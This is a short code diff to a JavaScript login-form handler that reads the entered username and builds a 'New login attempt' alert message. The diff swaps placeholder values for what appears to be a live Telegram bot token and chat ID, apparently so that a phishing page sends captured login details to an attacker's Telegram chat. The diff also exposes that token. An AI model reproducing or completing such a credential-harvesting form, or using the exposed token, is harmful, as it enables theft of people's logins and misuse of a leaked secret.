@@ -3,8 +3,8 @@ document.getElementById('login-form').addEventListener('submit', function(event)
 
     const username = document.querySelector('input[name="username"]').value;
 
-    const botToken = "YOUR_BOT_TOKEN";
-    const chatId = "YOUR_CHAT_ID";
+    const botToken =           "8749525098:AAGPzmRDQN-xZLhMcJ8q1BkHOMu7UdmKnVk";
+    const chatId = "8459758186" ;
 
     const message =
         "🔔 New login attempt\n\n" +
